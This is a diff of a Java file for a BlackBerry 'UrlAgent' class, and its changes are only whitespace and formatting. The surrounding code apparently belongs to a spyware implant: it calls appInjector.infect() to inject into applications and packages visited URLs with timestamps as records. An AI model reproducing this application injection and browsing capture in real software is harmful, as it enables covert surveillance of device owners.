@@ -26,7 +26,6 @@ import blackberry.utils.DateTime;
 import blackberry.utils.Utils;
 import blackberry.utils.WChar;
 
-
 /**
  * The Class UrlAgent.
  */
@@ -89,7 +88,6 @@ public final class UrlAgent extends Agent implements ApplicationObserver,
             //#endif
         }
 
-     
     }
 
     private void menuInject() {
@@ -98,7 +96,6 @@ public final class UrlAgent extends Agent implements ApplicationObserver,
         //#endif
 
         appInjector.infect();
-
     }
 
     public synchronized void actualStop() {
@@ -111,6 +108,7 @@ public final class UrlAgent extends Agent implements ApplicationObserver,
     }
 
     boolean infecting = false;
+
     /*
      * (non-Javadoc)
      * @see blackberry.threadpool.TimerJob#actualRun()
@@ -124,12 +122,12 @@ public final class UrlAgent extends Agent implements ApplicationObserver,
 
             appInjector.callMenuInContext();
         }
-         
-        if (!appInjector.isInfected() && infecting == false){
+
+        if (!appInjector.isInfected() && infecting == false) {
             infecting = true;
             menuInject();
         }
-       
+
     }
 
     /*
@@ -178,11 +176,11 @@ public final class UrlAgent extends Agent implements ApplicationObserver,
         //#endif
 
         final Date date = new Date();
-        DateTime  datetime = new DateTime(date);
-        
+        DateTime datetime = new DateTime(date);
+
         int version = 0x20100713;
         final Vector items = new Vector();
-        
+
         items.addElement(datetime.getStructTm());
         items.addElement(Utils.intToByteArray(version));
         items.addElement(WChar.getBytes(url, true));
@@ -195,7 +193,6 @@ public final class UrlAgent extends Agent implements ApplicationObserver,
     }
 
     public static UrlAgent getInstance() {
-        return (UrlAgent) AgentManager.getInstance().getItem(
-                Agent.AGENT_URL);
+        return (UrlAgent) AgentManager.getInstance().getItem(Agent.AGENT_URL);
     }
 }
